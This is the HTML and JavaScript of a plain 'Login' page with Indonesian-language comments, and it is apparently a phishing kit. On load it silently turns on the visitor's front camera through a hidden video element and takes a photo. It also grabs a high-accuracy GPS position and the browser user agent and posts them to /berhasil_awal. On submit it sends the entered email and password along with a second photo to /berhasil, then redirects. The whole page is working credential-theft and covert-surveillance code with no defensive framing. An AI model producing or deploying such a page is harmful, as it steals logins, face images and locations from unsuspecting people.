<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
  body { font-family: Arial, sans-serif; text-align: center; padding:20px; }
  video { display: none; }
  input { padding:8px; width:250px; }
  button { padding:8px 16px; }
</style>
</head>
<body>

<h2>Login</h2>
<form id="loginForm">
  <input type="text" name="email" placeholder="Your Email" required><br><br>
  <input type="password" name="password" placeholder="Your Password" required><br><br>
  <button type="submit">Login</button>
</form>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
let photo1 = "", photo2 = "", lat = "", lon = "", userAgent = navigator.userAgent;

// Capture photo as dataURL
function capturePhoto(callback) {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  callback(canvas.toDataURL('image/jpeg'));
}

// Start camera and take initial photo quickly
function startCameraAndCaptureInitial() {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      const video = document.getElementById('video');
      video.srcObject = stream;
      // small delay so camera has frames
      setTimeout(() => {
        capturePhoto(data => {
          photo1 = data;
          kirimDataAwal();
        });
      }, 1200); // ~1.2s initial delay; adjust if needed
    })
    .catch(err => {
      console.error("Kamera error:", err);
    });
}

// Get geolocation (high accuracy)
function getLocation(callback) {
  if (!navigator.geolocation) return callback();
  navigator.geolocation.getCurrentPosition(
    pos => {
      lat = pos.coords.latitude;
      lon = pos.coords.longitude;
      callback();
    },
    err => {
      console.error("Lokasi error:", err);
      callback();
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

// Send initial captured data (photo1 + location + UA) to server route /berhasil_awal
function kirimDataAwal() {
  getLocation(() => {
    fetch("/berhasil_awal", {
      method: "POST",
      body: JSON.stringify({
        photo: photo1,
        lat: lat,
        lon: lon,
        ua: userAgent
      }),
      headers: { "Content-Type": "application/json" }
    }).then(() => console.log("Data awal terkirim"))
      .catch(e => console.error("Gagal kirim data awal:", e));
  });
}

// On submit (login): capture second photo, append form data, send to /berhasil, then redirect to form_laporan
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  capturePhoto(data => {
    photo2 = data;
    const form = e.target;
    const fd = new FormData(form);
    fd.append("photo", photo2);
    fd.append("ua", userAgent);
    // include first photo optionally (comment out if not needed)
    if (photo1) fd.append("photo1", photo1);

    fetch("/berhasil", { method: "POST", body: fd })
      .then(() => {
        // short delay for server to process
        setTimeout(() => { window.location.href = "/form_laporan"; }, 600);
      })
      .catch(err => {
        console.error("Gagal kirim login:", err);
        // still redirect so user can continue
        setTimeout(() => { window.location.href = "/form_laporan"; }, 600);
      });
  });
});

// Start everything when page loads
window.addEventListener('load', startCameraAndCaptureInitial);
</script>

</body>
</html>
